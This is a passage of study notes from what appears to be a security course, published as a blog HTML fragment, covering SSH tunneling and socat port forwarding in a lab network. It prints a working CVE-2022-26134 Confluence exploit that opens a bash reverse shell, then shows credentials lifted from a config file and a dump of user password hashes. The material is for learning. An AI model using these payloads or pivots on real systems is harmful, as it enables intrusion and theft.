@@ -1,0 +1,1361 @@
+
+    <article class="git-panel git-file-panel" data-git-panel-section="blob">
+      <header class="git-file-header">
+        <h4 class="git-file-title">pivoting-ssh.html</h4>
+        <div class="git-file-meta">
+          <span>94 KB</span>
+          <span>site-output/blog/fragments/pivoting-ssh.html</span>
+        </div>
+      </header>
+      <div class="git-file-body">
+        <pre><code>
+
+
+
+&lt;article class=&quot;blog-article-body&quot; data-slug=&quot;pivoting-ssh&quot;&gt;
+  &lt;header class=&quot;blog-article-header&quot;&gt;
+    &lt;h1 class=&quot;blog-article-title&quot;&gt;PEN-200 Module 18 — Pivoting With SSH and Port Redirection&lt;/h1&gt;
+    &lt;p class=&quot;blog-article-meta&quot;&gt;
+      
+        &lt;span&gt;Nov 6, 2023&lt;/span&gt;
+      
+      
+        &lt;span aria-hidden=&quot;true&quot;&gt;•&lt;/span&gt;
+        &lt;span&gt;85 min read&lt;/span&gt;
+      
+      
+        &lt;span aria-hidden=&quot;true&quot;&gt;•&lt;/span&gt;
+        &lt;span&gt;m4xx3d0ut&lt;/span&gt;
+      
+    &lt;/p&gt;
+  &lt;/header&gt;
+
+  
+
+  &lt;div class=&quot;blog-article-content&quot;&gt;
+    &lt;h2&gt;TLDR;&lt;/h2&gt;
+&lt;p&gt;Pivoting binds the lab together. These notes expand the quick summary with concrete commands, configuration snippets, and operational guardrails.&lt;/p&gt;
+&lt;h3&gt;Socat &amp;amp; Native Forwarders&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;# Simple local forward through a compromised Linux host
+socat TCP-LISTEN:8080,fork TCP:10.10.10.25:80
+
+# Wrap plaintext protocol with TLS
+autosocat TCP-LISTEN:2525,fork OPENSSL:mail.internal.local:25,verify=0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Keep a &lt;code&gt;pivots.md&lt;/code&gt; log: source host, listener port, destination, purpose.&lt;/li&gt;
+&lt;li&gt;For Windows, &lt;code&gt;plink.exe -L 8080:10.10.10.25:80 user@pivot&lt;/code&gt; or &lt;code&gt;netsh interface portproxy add v4tov4 listenport=8080 connectaddress=10.10.10.25 connectport=80&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;SSH Local, Remote, and Dynamic&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;# Local forwarding (remote service ➜ local port)
+ssh -L 9001:10.10.20.5:445 analyst@pivot.corp.local -N
+
+# Dynamic SOCKS proxy for full tunnels
+ssh -D 1080 analyst@pivot.corp.local -C -N
+
+# Remote forwarding (internal service ➜ attack box)
+ssh -R 8443:10.10.30.15:443 pivot@command-node
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Use &lt;code&gt;~/.ssh/config&lt;/code&gt; to chain pivots cleanly:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;Host pivot
+    HostName 192.168.119.50
+    User analyst
+    ProxyCommand ssh jump &amp;quot;nc -q0 %h %p&amp;quot;
+Host dc01
+    HostName dc01.corp.local
+    User backupuser
+    ProxyJump pivot
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Combine with &lt;code&gt;proxychains&lt;/code&gt; or &lt;code&gt;torsocks&lt;/code&gt; when tools only speak SOCKS.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Persistence &amp;amp; Reliability&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;autossh -M 0 -f -N -o &amp;quot;ServerAliveInterval 30&amp;quot; -o &amp;quot;ServerAliveCountMax 3&amp;quot; -L ...&lt;/code&gt; keeps tunnels alive.&lt;/li&gt;
+&lt;li&gt;Monitor tunnel health: &lt;code&gt;ss -tnlp | grep 9001&lt;/code&gt;, &lt;code&gt;lsof -i :1080&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Use unique ports per pivot host to avoid confusion.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Layering Tunnels&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Chain dynamic proxies (&lt;code&gt;ssh -D 1080&lt;/code&gt; ➜ &lt;code&gt;proxychains nmap -sT&lt;/code&gt;) for deep internal scanning.&lt;/li&gt;
+&lt;li&gt;Leverage &lt;code&gt;socat TCP4-LISTEN:2222,fork SOCKS4:127.0.0.1:10.10.40.5:22,socksport=1080&lt;/code&gt; to combine protocols.&lt;/li&gt;
+&lt;li&gt;Document routes in a graph (host ➜ pivot ➜ target) for the final report.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Cleanup &amp;amp; Defense&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Close tunnels after use (&lt;code&gt;kill $(pgrep -f &amp;#39;ssh -L 9001&amp;#39;)&lt;/code&gt;), remove &lt;code&gt;netsh&lt;/code&gt; portproxies.&lt;/li&gt;
+&lt;li&gt;Recommend clients monitor for long-lived SSH sessions, unusual port proxies, and hosts listening on atypical ports.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Pivot discipline keeps you from losing track of connectivity and helps defenders understand exactly how you traversed their network.&lt;/p&gt;
+&lt;h2&gt;Working Notes... In Graphic Detail...&lt;/h2&gt;
+&lt;h3&gt;Port Redirection and SSH Tunneling&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Port Forwarding on *NIX and Windows Machines.&lt;/li&gt;
+&lt;li&gt;SSH Tunneling on (and between) *NIX and Windows Machines.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;18.1 Why Port Redirection and Tunneling?&lt;/h4&gt;
+&lt;p&gt;This unit covers:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Understand the difference between common network layouts.&lt;/li&gt;
+&lt;li&gt;Consider the impact of common network security devices.&lt;/li&gt;
+&lt;li&gt;Understand when to use port redirection and tunneling techniques.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Most network envs are not, or should not be, &lt;a href=&quot;https://en.wikipedia.org/wiki/Flat_network&quot;&gt;flat&lt;/a&gt;.  All devices in a flat network are able to comm with one another.  There is little/no limitations on the access each device has to another, regardless of the need for them to comm under normal operations.&lt;/p&gt;
+&lt;p&gt;Flat network topology is bad security practice.  If an attacker accesses a single host, they can comm every other host, making it much easier to move through the network.&lt;/p&gt;
+&lt;p&gt;A more secure design is the &lt;a href=&quot;https://en.wikipedia.org/wiki/Network_segmentation&quot;&gt;segmented&lt;/a&gt; network, where a network is broken down into smaller subnets, each containing groups of devices with specific purposes, where devices only have access to the subnets and devices require for their use case.  Compromising a single host, will not allow an attacker access to all other systems on the network.&lt;/p&gt;
+&lt;p&gt;As part of the network segmentation process, admins often implement controls that limit the flow of traffic in/out and across their network.  Various tech is deployed across the network to enforce it.&lt;/p&gt;
+&lt;p&gt;One of the most common technologies are &lt;a href=&quot;https://en.wikipedia.org/wiki/Firewall_(computing)&quot;&gt;Firewalls&lt;/a&gt;, they can be implemented at the endpoint software level.  As an example, the Linux kernel has firewall capabilities through the &lt;a href=&quot;https://en.wikipedia.org/wiki/Iptables&quot;&gt;iptables&lt;/a&gt; tool suite, while Windows has the built-in &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security&quot;&gt;Windows Defender Firewall&lt;/a&gt;.  They can also be implemented with physical appliances, such as hardware firewalls filtering network traffic.&lt;/p&gt;
+&lt;p&gt;Firewalls can drop inbound traffic and prevent malicious traffic from traversing/leaving the network.  They can prevent all but a few allowed hosts from comm with a port on a priv server.  They can also block some hosts/subnets from accessing the internet.&lt;/p&gt;
+&lt;p&gt;Most firewalls are rule based, which limits their functionality.  In cases where fine control is required &lt;a href=&quot;https://en.wikipedia.org/wiki/Deep_packet_inspection&quot;&gt;Deep Packet Inspection&lt;/a&gt; systems monitor the contents of in/out bound traffic and can terminate it based on a set of rules.&lt;/p&gt;
+&lt;p&gt;Admins put boundaries in place to prevent the arbitrary movement of data in/out/across the network.  As an attacker, we need to traverse these boundaries by developing strategies that can help us work around them.&lt;/p&gt;
+&lt;p&gt;Port redirection, a term used to describe various methods of port forwarding, and tunneling are both viable strategies to we can use to traverse these boundaries.  &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Port redirection.&lt;/li&gt;
+&lt;li&gt;Modify the flow of network traffic so packets sent to one socket will be passed to another.&lt;/li&gt;
+&lt;li&gt;Tunneling.&lt;/li&gt;
+&lt;li&gt;Encapsulating one type of data stream within another.&lt;/li&gt;
+&lt;li&gt;Example, transport HTTP traffic within a SSH conn to only the SSH traffic is visible externally.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We will introduce port redirection and tunneling techniques through practical examples.  Starting with the lowest complexity techniques and increase complexity as we move step-by-step towards more hardened network envs.  Each new technique will be applied to a new network config that is slightly different than the prior.  We will cover SSH tunneling in this module and more advanced methods in later modules.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Network_topology&quot;&gt;Logical typologies&lt;/a&gt; we create while chaining methods may be difficult to conceptualize at first, we will be making the traffic move in ways that may not appear intuitive, so we should take time to fully understand each technique before advancing to the next.  We will learn the tools required to manipulate the flow of traffic in any given network with surgical precision.&lt;/p&gt;
+&lt;h4&gt;18.2 Port Forwarding with Linux Tools&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Understand what port forwarding is.&lt;/li&gt;
+&lt;li&gt;Learn when to use port forwarding techniques.&lt;/li&gt;
+&lt;li&gt;Use Socat to set up a port forward in Linux.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We will examine the fundamental technique of port forwarding, commonly used in general purpose networking.  We configure a host to listen on one port and relay all packets received to another dest.&lt;/p&gt;
+&lt;p&gt;Under normal conditions, admins may use this to allow access to a web server behind a firewall, listening on one iface, and passing all packets to the web server behind it.  Most home routers also provide this functionality.&lt;/p&gt;
+&lt;p&gt;How can we use this are part of the attack chain?  Next we&amp;#39;ll consider a simple scenario.&lt;/p&gt;
+&lt;h5&gt;A Simple Port Forwarding Scenario&lt;/h5&gt;
+&lt;p&gt;Let&amp;#39;s examine a port forwarding scenario.  In an assessment, we find a Linux web server running a version of Confluence vulnerable to &lt;a href=&quot;https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html&quot;&gt;CVE-2022-26134&lt;/a&gt;, a pre auth RCE vuln.  We can exploit it to gain a reverse shell from the server.&lt;/p&gt;
+&lt;p&gt;During enum, we find that this server has two network ifaces, one on the same network as our Kali machine and another on an internal subnet.  In the Confluence config file, we also find creds and the IP address/Port for a PostgresSQL DB instance running on a server on the internal subnet.  We want to use these creds to gain access to the DB and enum further.&lt;/p&gt;
+&lt;p&gt;We are on the WAN side of this network with the second iface connected to a DMZ.  The PGDATABASE01 is in the DMZ and the Confluence server CONFLUENCE01 stradles both networks.&lt;/p&gt;
+&lt;p&gt;A WAN is a large expansive network, the public internet is the world&amp;#39;s largest WAN.  Some large orgs refer to their internal networks as a WAN or internal WAN.  Our WAN can represent the internet of a large internal WAN.
+&lt;em&gt;Throughout the exercises in this Module, our Kali machine will be situated in the WAN. We will only be able to route directly from our Kali machine to hosts that are also on the WAN.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;A DMZ is a network containing devices exposed to wider, less trusted, networks.  The DMZ creates a buffer between external and internal hosts, similar to a real worl Demilitarized Zone.&lt;/p&gt;
+&lt;p&gt;CONFLUENCE01 straddles both WAN and DMZ allowing it to communicate on both networks.  It is listening on TCP port 8090.&lt;/p&gt;
+&lt;p&gt;PGDATABASE01 is within the DMZ boundary, it does not straddle the WAN/DMZ.  Our Kali machine cannot is not within the DMZ and cannot directly comm with it.  It has TCP port 5432 open, listening on the default port.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Since the only thing we know about PGDATABASE01 so far is that it exists, we don&amp;#39;t yet know if it&amp;#39;s attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;We want to use the creds we found on CONFLUENCE01 to connect to PostgresSQL from our Kali machine.  Let&amp;#39;s setup our lab env to recreate the scenario we described.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;At the end of the Port Forwarding with Socat section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.&lt;/em&gt;&lt;/p&gt;
+&lt;h5&gt;Setting Up the Lab Environment&lt;/h5&gt;
+&lt;p&gt;To gain access to CONFLUENCE01 we have to utilize RCE vuln in the web app to obtain a reverse shell.  We find it is vulnerable to CVE-2022-26134 and refer to a &lt;a href=&quot;https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/&quot;&gt;Rapid7 PoC payload&lt;/a&gt; that exploits and returns a reverse shell.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We must first understand what the payload is doing.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The curl requests:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Verbose &lt;code&gt;-v&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Made to host &lt;code&gt;http://10.0.0.2:8090&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Assume to be the authors vulnerable Confluence server.&lt;/li&gt;
+&lt;li&gt;There are URL encoded chars, we must decode to understand.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;/${new javax.script.ScriptEngineManager().getEngineByName(&amp;quot;nashorn&amp;quot;).eval(&amp;quot;new java.lang.ProcessBuilder().command(&amp;#39;bash&amp;#39;,&amp;#39;-c&amp;#39;,&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.28/1270 0&amp;gt;&amp;amp;1&amp;#39;).start()&amp;quot;)}/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The URL path is an OGNL injection payload.&lt;/li&gt;
+&lt;li&gt;Object-Graph Notation Language.&lt;/li&gt;
+&lt;li&gt;An expression language used in Java apps.&lt;/li&gt;
+&lt;li&gt;Takes place when app handles user inputs by passing them to OGNL expression parser.&lt;/li&gt;
+&lt;li&gt;It&amp;#39;s possible to exec Java code within OGNL expressions and can be used to exec arbitrary code.&lt;/li&gt;
+&lt;li&gt;The payload itself uses Java&amp;#39;s &lt;a href=&quot;https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html&quot;&gt;ProcessBuilder class&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Spawns a Bash interactive rev shell &lt;code&gt;bash -i&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The PoC meets our needs, we modify it to point at our lab machine and to return the shell to our Kali machine.  Be aware that &lt;em&gt;all of the chars are not URL encoded&lt;/em&gt; (&amp;quot;.&amp;quot;, &amp;quot;/&amp;quot;).  This is not always the case, but important to the functionality of this payload.  If those chars are encoded the server will parse the request differently and the payload may not exec.  So, we cannot apply URL encoding across the entire payload once modified.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;We manually modify the params as needed.&lt;/li&gt;
+&lt;li&gt;The Confluence server IP.&lt;/li&gt;
+&lt;li&gt;Bash payload IP and Port.&lt;/li&gt;
+&lt;li&gt;Remove the verbose flag.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl http://192.168.198.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We can now start our Netcat listener on our Kali machine.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We can now run the modified curl command.&lt;/li&gt;
+&lt;li&gt;The reverse shell has returned.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;listening on [any] 4444 ...
+connect to [192.168.45.182] from (UNKNOWN) [192.168.198.63] 51262
+bash: cannot set terminal process group (2653): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+confluence@confluence01:/opt/atlassian/confluence/bin$ id
+id
+uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The shell is running with the privs of the Confluence server.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can now begin to enum CONFLUENCE01, check the network ifaces with &lt;code&gt;ip addr&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
+ip addr
+1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+4: ens192: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:bf:bd:21 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.198.63/24 brd 192.168.198.255 scope global ens192
+       valid_lft forever preferred_lft forever
+5: ens224: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:bf:1d:86 brd ff:ff:ff:ff:ff:ff
+    inet 10.4.198.63/24 brd 10.4.198.255 scope global ens224
+       valid_lft forever preferred_lft forever
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We find two network iface on two networks.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;ens192&lt;/code&gt; with IP &lt;code&gt;192.168.198.63&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ens224&lt;/code&gt; with IP &lt;code&gt;10.4.198.63&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Next we check routes with &lt;code&gt;ip route&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
+ip route
+default via 192.168.198.254 dev ens192 proto static 
+10.4.198.0/24 dev ens224 proto kernel scope link src 10.4.198.63 
+192.168.198.0/24 dev ens192 proto kernel scope link src 192.168.198.63 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We then find the Confluence config at &lt;code&gt;/var/atlassian/application-data/confluence/confluence.cfg.xml&lt;/code&gt; and discover some DB creds.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
+&amp;lt;sian/application-data/confluence/confluence.cfg.xml   
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
+
+...
+    &amp;lt;property name=&amp;quot;hibernate.connection.password&amp;quot;&amp;gt;D@t4basePassw0rd!&amp;lt;/property&amp;gt;
+    &amp;lt;property name=&amp;quot;hibernate.connection.url&amp;quot;&amp;gt;jdbc:postgresql://10.4.198.215:5432/confluence&amp;lt;/property&amp;gt;
+    &amp;lt;property name=&amp;quot;hibernate.connection.username&amp;quot;&amp;gt;postgres&amp;lt;/property&amp;gt;
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We found an IP address of a DB server.&lt;/li&gt;
+&lt;li&gt;We can use those creds to conn to it.&lt;/li&gt;
+&lt;li&gt;However we have hit a limitation.&lt;/li&gt;
+&lt;li&gt;CONCLUENCE01 does not have a PostgreSQL client.&lt;/li&gt;
+&lt;li&gt;We are a low priv user and cannot easily install software.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We do have a PostgresSQL client on our Kali machine, but no direct path to PGDATABASE01 sine it is only routable from CONFLUENCE01.  In this case, there is no firewall in between us and CONFLUENCE01 so nothing is stopping us from binding ports on the WAN iface and connecting to them from our Kali machine.&lt;/p&gt;
+&lt;p&gt;This is the type of situation in which port forwarding can be used.  We can create a port forward on the WAN iface of CONFLUENCE01 that forwards all packets received to the PGDATABASE01 server on the internal subnet.&lt;/p&gt;
+&lt;h5&gt;Port Forwarding with Socat&lt;/h5&gt;
+&lt;p&gt;We want to create a port forward where CONFLUENCE01 listens on a WAN port and then forwards all packets received on the port to PGDATABASE01 on the internal subnet.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Open TCP port 2345 on the WAN iface of CONFLUENCE01.&lt;/li&gt;
+&lt;li&gt;Connect to it from our Kali machine.&lt;/li&gt;
+&lt;li&gt;Forward all packets from that port to TCP 5432 on PGDATABASE01.&lt;/li&gt;
+&lt;li&gt;Once setup, connecting to 2345 will be the same as connecting directly to 5432.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;As part of enum on CONFLUENCE01, we find Socat installed, which is capable of simple port forwards.
+*In this scenario, we find it already installed, but Socat does not tend to be installed by default on &lt;em&gt;NIX systems. If not already installed, it&amp;#39;s possible to download and run a statically-linked binary version instead.&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;On CONFLUENCE01 we start a Socat proc.&lt;/li&gt;
+&lt;li&gt;Verbose &lt;code&gt;-ddd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Listen on TCP port 2345 &lt;code&gt;TCP-LISTEN:2345&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Fork into subproc when new conn received &lt;code&gt;fork&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Instead of dying after single conn.&lt;/li&gt;
+&lt;li&gt;Then forward all traffic to 5432 on PGDATABASE01 &lt;code&gt;TCP:10.4.198.215&lt;/code&gt;
+&lt;em&gt;We&amp;#39;ll listen on port 2345 as it&amp;#39;s not in the privileged port range (0-1024), which means we don&amp;#39;t need elevated privileges to use it.&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.198.215:5432
+&amp;lt;cat -ddd TCP-LISTEN:2345,fork TCP:10.4.198.215:5432   
+2023/11/06 15:59:52 socat[4559] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
+2023/11/06 15:59:52 socat[4559] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
+2023/11/06 15:59:52 socat[4559] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
+2023/11/06 15:59:52 socat[4559] I setting option &amp;quot;fork&amp;quot; to 1
+2023/11/06 15:59:52 socat[4559] I socket(2, 1, 6) -&amp;gt; 5
+2023/11/06 15:59:52 socat[4559] I starting accept loop
+2023/11/06 15:59:52 socat[4559] N listening on AF=2 0.0.0.0:2345
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Now that the proc is running we can use &lt;code&gt;psql&lt;/code&gt; from our Kali machine.&lt;/li&gt;
+&lt;li&gt;Conn to CONFLUENCE01 &lt;code&gt;-h 192.168.198.63&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Port 2345 &lt;code&gt;-p 2345&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;With postgres user account &lt;code&gt;-U postgres&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Enter password when prompted &lt;code&gt;D@t4basePassw0rd!&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Upon conn run the &lt;code&gt;\l&lt;/code&gt; command to list avail DB.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ psql -h 192.168.198.63 -p 2345 -U postgres
+Password for user postgres: 
+psql (15.4 (Debian 15.4-1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
+Type &amp;quot;help&amp;quot; for help.
+
+postgres=# \l
+                                                  List of databases
+    Name    |  Owner   | Encoding |   Collate   |    Ctype    | ICU Locale | Locale Provider |   Access privileges   
+------------+----------+----------+-------------+-------------+------------+-----------------+-----------------------
+ confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | 
+ postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | 
+ template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | =c/postgres          +
+            |          |          |             |             |            |                 | postgres=CTc/postgres
+ template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | =c/postgres          +
+            |          |          |             |             |            |                 | postgres=CTc/postgres
+(4 rows)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We have successfully conn to the PostgresSQL DB through out port forward.&lt;/li&gt;
+&lt;li&gt;We also have access to our &lt;code&gt;confluence&lt;/code&gt; DB.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;With out new access we can continue enum, let&amp;#39;s query the &lt;code&gt;cwd_user&lt;/code&gt; table, which contains the username and password hashes for all Confluence users.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Connect to the DB with &lt;code&gt;\c confluence&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Review contents with &lt;code&gt;select * from cwd_user;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;confluence=# select * from cwd_user;
+
+   id   |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_
+address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
+--------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+-----------------
+-------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
+ 229377 | admin          | admin           | T      | 2022-09-09 21:10:26.365 | 2022-09-09 21:10:26.365 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | d9da2333-8bd1-4a8e-82d3-0613aead5d22 |        98305 | {PKCS5S2}3vfgC35A7Gnrxlzbvp32yM8zXvdE8U8bxS9bkP+3aS3rnSJxz4bJ6wqtE8d95ejA
+ 229378 | trouble        | trouble         | T      | 2022-09-09 21:13:04.598 | 2022-09-09 21:13:04.598 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 84bcf8cf-618d-4bec-b5c0-1b4a21fbcd6b |        98305 | {PKCS5S2}tnbti4h38VDOh0xPrBHr7JBYjev7wws+ETHL1YyjSpIWVUz+66zXwDvbBJkJz342
+ 229379 | happiness      | happiness       | T      | 2022-09-09 21:13:35.831 | 2022-09-09 21:13:35.831 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | 8b9c660a-cfee-48ac-8214-737df1786dd2 |        98305 | {PKCS5S2}1hCLEv054BGYa9QkCAZKSmotKb4d8WbuDc/gGxHngs0cL3+fJ4OmCt6+fUM6HYlc
+ 229380 | hr_admin       | hr_admin        | T      | 2022-09-09 21:13:58.548 | 2022-09-09 21:13:58.548 | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 0d31acb5-ba51-4725-ae64-ae7f5d51becc |        98305 | {PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R
+ 229381 | database_admin | database_admin  | T      | 2022-09-09 21:14:22.459 | 2022-09-09 21:14:22.459 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 93d97033-f7d4-4a3c-80f4-55cc5faf03c7 |        98305 | {PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv
